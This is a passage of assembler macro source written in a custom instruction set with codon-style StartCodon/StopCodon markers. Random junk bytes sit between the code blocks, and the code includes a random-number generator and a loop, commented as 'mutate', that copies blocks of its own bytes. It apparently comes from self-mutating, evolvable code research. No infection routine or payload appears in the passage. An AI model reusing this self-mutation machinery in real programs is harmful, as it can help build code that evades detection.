        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 254
db 9
db 1
db 190
db 28
db 5
db 125
db 157
db 40
db 10
db 20
db 92
db 153
db 54
db 104
db 49
db 215
db 20
db 162
db 15
db 245
db 93
db 169
db 59
db 163
db 233
db 131
db 137
db 163
db 61
db 102
db 211
db 20
db 248
db 78
db 167
db 192
db 66
db 32
db 55
db 40
db 195
db 246
db 224
db 195
db 127
db 107
db 166
db 12
db 236
db 236
db 138
db 44
db 225
db 178
db 229
db 78
db 228
db 160
db 19
db 69
db 151
db 115
db 174
db 97
db 43
db 110
db 219
db 148
db 46
db 23
db 185
db 150
db 225
db 18
db 7
db 195
db 54
db 199
db 56
db 242
db 102
db 131
db 90
db 26
db 188
db 212
db 127
db 203
db 235
db 87
db 165
db 157
db 207
db 6
db 180
db 170
db 46
db 99
db 162
db 195
db 73
db 186
db 66
db 38
db 144
db 202
db 168
db 179
db 12
db 194
db 216
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord                          ; !!! nBlockSize
       _save                                ; BC2=nBlockSize
    _getDO
    BigNum=InsEnd-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 208
db 247
db 109
db 206
db 162
db 35
db 215
db 101
db 110
db 155
db 201
db 157
db 207
db 61
db 246
db 176
db 251
db 232
db 55
db 6
db 253
db 241
db 132
db 16
db 171
db 192
db 195
db 146
db 58
db 97
db 29
db 14
db 174
db 71
db 58
db 115
db 245
db 29
db 79
db 38
db 205
db 15
db 211
db 12
db 175
db 249
db 54
db 202
db 158
db 236
db 27
db 235
db 106
db 99
db 29
db 224
db 47
db 164
db 214
db 154
db 18
db 212
db 188
db 3
db 93
db 107
db 110
db 175
db 92
db 90
db 139
db 194
db 252
db 202
db 102
db 110
db 39
db 32
db 146
db 98
db 140
db 53
db 21
db 27
db 65
db 70
db 197
db 205
db 150
db 118
db 250
db 242
db 62
db 182
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 207
db 145
db 52
db 238
db 65
db 24
db 106
db 177
db 34
db 74
db 205
db 53
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 59
db 54
db 211
db 228
db 116
db 140
db 64
db 63
db 74
db 16
db 87
db 107
db 23
db 58
db 129
db 184
db 102
db 140
db 147
db 8
db 134
db 158
db 226
db 98
db 41
db 133
db 227
db 209
db 188
db 170
db 194
db 62
db 11
db 161
db 164
db 165
db 16
db 66
db 235
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
       _pop                                 ; BC1 = InsStart
       _addsaved                            ; BC1 = InsStart + nBlockSize = InsEnd
       _writeDWord                          ; !!! InsEnd
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
db StopCodon
db 176
db 255
db 14
db 116
db 168
db 234
db 252
db StartCodon
    if BigNum<25
db StopCodon
db 91
db 223
db 11
db 151
db 121
db 81
db 250
db 108
db 32
db 164
db 238
db 41
db 221
db 99
db 190
db 16
db 50
db 34
db 140
db 210
db 77
db 179
db 222
db 163
db 10
db 3
db 45
db 121
db 146
db 16
db 38
db 205
db 171
db 14
db 11
db 244
db 174
db 153
db 23
db 253
db 38
db 109
db 158
db 99
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 43
db 123
db 162
db 203
db 166
db 155
db 158
db 135
db 43
db 234
db 67
db 10
db 64
db 178
db 65
db 221
db 196
db 44
db 62
db 245
db 197
db 107
db 200
db 164
db 186
db 138
db 192
db 255
db 25
db 62
db 224
db 124
db 98
db 147
db 21
db 193
db 111
db 66
db 161
db 180
db 214
db 48
db 170
db 69
db 68
db 125
db 167
db 227
db 113
db 117
db 246
db 81
db 191
db 73
db 116
db 191
db 243
db 221
db 3
db 10
db 129
db 222
db 84
db 123
db 44
db 119
db 170
db 217
db 54
db 230
db 103
db 40
db 193
db 229
db 47
db 127
db 136
db 44
db 181
db 81
db 23
db 170
db 169
db StartCodon
        _push  ; BC1 to stack
        _save
_nopREAL
_nopREAL
_nopREAL
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _saveWrtOff
        _getdata
        _nopdA                   ; eax=[RandomNumber]
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=1103515245
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 146
db 120
db 127
db 143
db 3
db 0
db 186
db 142
db 231
db 30
db 28
db 14
db 104
db 58
db 206
db 135
db 242
db 123
db 175
db 160
db 77
db 186
db 23
db 93
db 172
db 127
db 112
db 73
db 175
db 171
db 216
db 218
db 166
db 62
db 217
db 30
db 75
db 52
db 107
db 55
db 149
db 144
db 194
db 97
db 123
db 203
db 102
db 222
db 226
db 238
db 247
db 24
db 200
db 28
db 55
db 25
db 112
db 8
db 23
db 85
db 70
db 115
db 231
db 78
db 245
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 56
db 91
db 186
db 138
db 247
db 105
db 196
db 76
db 144
db 0
db 174
db 157
db 108
db 51
db 229
db 107
db 204
db 88
db 139
db 235
db 99
db 86
db 186
db 252
db 202
db 5
db 8
db 29
db 210
db 126
db 13
db 255
db 4
db 188
db 18
db 8
db 191
db 18
db 120
db 198
db 155
db 219
db 73
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _save
        _and
        _popall
    end if
        _mul                     ; eax*=1103515245 % 2^32
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
db StopCodon
db 74
db 177
db 123
db 143
db 200
db 169
db 27
db 20
db StartCodon
    BigNum=12345
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 182
db 17
db 128
db 41
db 190
db 243
db 51
db 136
db 11
db 111
db 19
db 232
db 55
db 142
db 75
db 62
db 174
db 153
db 64
db 81
db 33
db 96
db 1
db 223
db 41
db 42
db 71
db 59
db 34
db 123
db 128
db 125
db 239
db 15
db 87
db 164
db 175
db 15
db 247
db 94
db 34
db 58
db 143
db 1
db 41
db 160
db 161
db 114
db 125
db 189
db 206
db 108
db 143
db 35
db 224
db 155
db 159
db 47
db 86
db 169
db 43
db 66
db 16
db 198
db 89
db 54
db 203
db 208
db 133
db 154
db 22
db 68
db 166
db 147
db 172
db 47
db 48
db 88
db 125
db 192
db 0
db 124
db 46
db 111
db 79
db 160
db 14
db 184
db 74
db 250
db 101
db 253
db 80
db 148
db 165
db 195
db 217
db 59
db 231
db 170
db 59
db 75
db 26
db 158
db 154
db 40
db 233
db 195
db 139
db 146
db 28
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 214
db 94
db 173
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 12
db 69
db 51
db 205
db StartCodon
        _getdata
db StopCodon
db 250
db 136
db 164
db 157
db 239
db 129
db 94
db 44
db 24
db 17
db 198
db 194
db 70
db 0
db 185
db 59
db 226
db 183
db 128
db 55
db 226
db 167
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _save
        _nopsA
        _addsaved                ; eax+=12345 % 2^32
        _writeDWord              ; mov [RandomNumber], ebx
    _getDO
    BigNum=nByteBlockToMov-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 208
db 54
db 197
db 195
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 157
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
db StopCodon
db 88
db 71
db 124
db 23
db 24
db 182
db 181
db 80
db 137
db 235
db 172
db 232
db 218
db 127
db 240
db 39
db 93
db 197
db 142
db 195
db 108
db 231
db 225
db 29
db 151
db 224
db 52
db 37
db 241
db 17
db 21
db 206
db 147
db 132
db 15
db 232
db 35
db 170
db 60
db 106
db 230
db 204
db 189
db 112
db 24
db 115
db 91
db 73
db 97
db 145
db 103
db 126
db 237
db 185
db 179
db 210
db 11
db 171
db 122
db 176
db 44
db 253
db 97
db 209
db 12
db 148
db 221
db 11
db 70
db 59
db 112
db 101
db 188
db 164
db 147
db 246
db 86
db 86
db 238
db 150
db 100
db 147
db 174
db 31
db 213
db 8
db 13
db 38
db 133
db 139
db 0
db 243
db 46
db 226
db 71
db 181
db 119
db 240
db StartCodon
        _save
        _and
        _popall
    end if
       _saveWrtOff
    _getDO
db StopCodon
db 45
db StartCodon
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 246
db 149
db 82
db 64
db 121
db 106
db 181
db 15
db 163
db 214
db 194
db 166
db 168
db 246
db 148
db 228
db 101
db 203
db 153
db 102
db 166
db 144
db 219
db 19
db 60
db 233
db 125
db 228
db 41
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
db StopCodon
db 134
db 51
db 234
db 128
db 191
db 70
db 91
db 18
db 25
db 59
db 86
db 124
db 144
db 103
db 64
db 206
db 225
db 32
db 78
db 19
db 206
db 110
db 178
db 241
db 155
db 135
db 136
db 226
db 144
db 87
db 218
db StartCodon
        _save
        _and
        _popall
    end if
       _getdata
       _nopdA                               ; mov RegA, [RandomNumber]
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
       _nopdD                               ; mov RegD, 0
       _nopsB                               ; BC1=(FileSize-nBeforeIns)
       _div
       _nopsD                               ; BC1=nByteBlockToMov
    BigNum=1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord                          ; !!! nByteBlockToMov
    _getDO
    BigNum=InsStart-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 67
db 130
db 127
db 208
db 143
db 108
db 77
db 102
db 140
db 54
db 162
db 242
db 24
db 117
db 203
db 239
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 192
db 100
db 61
db 165
db 231
db 36
db 166
db 217
db 149
db 120
db 90
db 24
db 135
db 126
db 19
db 104
db 218
db 133
db 249
db 195
db 121
db 108
db 229
db 227
db 248
db 108
db 222
db 74
db 122
db 248
db 191
db 62
db 84
db 136
db 183
db 183
db 245
db 98
db 212
db 107
db 64
db 113
db 91
db 122
db 108
db 122
db 75
db 16
db 172
db 38
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _nopdA               ; RegA=InsStart
    _getDO
    BigNum=InsEnd-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 24
db 175
db 169
db 134
db 178
db 67
db 153
db 27
db 167
db 198
db 22
db 83
db 49
db 35
db 123
db 12
db 58
db 187
db 179
db 247
db 1
db 0
db 113
db 136
db 72
db 208
db 236
db 91
db 135
db 147
db 18
db 27
db 127
db 130
db 176
db 222
db 222
db 245
db 157
db 97
db 122
db 65
db 218
db 181
db 225
db 81
db 214
db 116
db 11
db 175
db 246
db 87
db 245
db 83
db 155
db 168
db 21
db 174
db 236
db 130
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _nopdB               ; RegB=InsEnd
    _getDO
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
    BigNum=nByteBlockToMov-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 128
db 155
db 131
db 231
db 132
db 154
db 41
db 117
db 12
db 18
db 35
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _nopdD               ; RegD=nByteBlockToMov=c
; do
       _getEIP
       _sub0001
db StopCodon
db 125
db 45
db 83
db 98
db 193
db 119
db 216
db 116
db 147
db 147
db StartCodon
       _sub0001
       _sub0001
       _sub0001
       _sub0001
       _saveJmpOff          ; mov BA2, eip
       _nopsD               ; BC1=c
       _save                ; BC2=c
       _nopsB               ; BC1=InsEnd
       _addsaved            ; BC1=InsEnd+c
       _saveWrtOff          ; BA1=InsEnd+c
db StopCodon
db 70
db 0
db 234
db 218
db 121
db 44
db StartCodon
       _pop                 ; If BC1=0: mutate
       _push
    BigNum=1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 182
db 205
db 99
db 236
db 252
db 43
db 86
db 245
db 201
db 242
db 10
db 104
db 241
db 104
db 142
db 10
db 253
db 70
db 32
db 88
db 59
db 138
db 63
db 157
db 89
db 154
db 210
db 242
db 122
db 38
db 126
db 5
db 50
db 178
db 247
db 175
db 249
db 194
db 103
db 173
db 211
db 48
db 137
db 177
db 43
db 98
db 75
db 136
db 7
db 44
db 221
db 122
db 162
db 64
db 113
db 85
db 127
db 120
db 217
db 135
db 136
db 35
db 249
db 197
db 12
db 31
db 80
db 130
db 97
db 244
db 199
db 126
db 164
db 34
db 56
db 31
db 192
db 59
db 153
db 92
db 157
db 174
db 225
db 230
db 142
db 99
db 80
db 126
db 1
db 215
db 122
db 243
db 129
db 248
db 137
db 201
db 142
db 251
db 37
db 231
db 169
db 227
db 97
db 102
db 228
db 208
db 191
db 184
db 145
db 50
db 194
db 66
db 5
db 35
db 115
db 79
db 0
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _sub0001             ; Get the zer0 flag
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
       _JnzDown
               _nopsA               ; BC1=InsStart
               _addsaved            ; BC1=InsStart+c
               _getdata             ; BC1=*(InsStart+c)
               _writeByte           ; *(InsEnd+c)==*(InsStart+c)
       _nopsD
       _sub0001
       _nopdD               ; RegD=c-1
       _JnzUp
; while --c
db StopCodon
db 116
db 54
db 125
db 163
db 92
db 221
db 184
db 200
db 75
db 19
db 144
db 161
db 69
db 248
db 124
db 185
db 140
db 240
db 195
db 199
db 139
db 204
db 199
db 237
db 222
db 0
db 140
db 97
db 223
db 23
db 186
db 111
db 59
db 8
db 234
db 36
db 12
db 108
db 254
db 141
db 41
db 136
db 105
db 96
db 229
db 22
db 174
db 51
db 97
db 204
db 225
db 223
db 3
db 35
db 56
db 163
db 44
db 82
db 19
db 162
db 86
db 198
db 112
db 13
db 111
db 164
db 111
db 150
db 234
db 141
db 174
db StartCodon
; Already set:
    _getDO
    BigNum=InsStart-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 144
db 245
db 140
db 93
db 131
db 19
db 145
db 38
db 198
db 181
db 14
db 128
db 117
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
